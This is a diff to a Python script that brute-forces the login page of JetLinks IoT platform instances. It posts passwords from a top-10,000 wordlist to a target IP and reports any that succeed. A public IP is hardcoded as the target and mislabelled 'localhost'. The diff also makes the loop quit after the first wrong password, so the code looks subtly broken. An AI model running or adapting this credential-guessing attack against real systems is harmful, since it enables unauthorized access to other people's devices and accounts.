@@ -14,8 +14,9 @@ ip = "101.34.143.5:8888"  # localhost
 url = "http://192.168.19.185:9000/jetlinks/authorize/login"
 # res = requests.get(url,headers=headers)
 
-def test_vun(ip):
+def test_vun(ip,passdir=''):
     url="http://{}/jetlinks/authorize/login".format(ip)
+
     with open('./somd5-top1w.txt', 'r') as f:
         lines = f.readlines()
         for index,line in enumerate(lines):
@@ -24,9 +25,12 @@ def test_vun(ip):
                     "tokenType": "default", "verifyKey": "",
                     "verifyCode": ""}
             try:
-                resp = requests.post(url, json=json)
-            except requests.ConnectionError :
-                print("Error")
+                resp = requests.post(url, json=json,timeout=5)
+            except requests.ConnectionError as e:
+                print(e)
+                return False
+            except Exception as e:
+                print(e)
                 return False
             if resp.status_code==404:
                 return False
@@ -34,7 +38,7 @@ def test_vun(ip):
                 return False
             if '密码' in resp.text:
                 if index%100==0: print('{} password incorrect,retrying {}'.format(ip,index))
-                continue
+                return False
             if resp.status_code==200:
                 return {'ip':ip,'password':password}
             else:
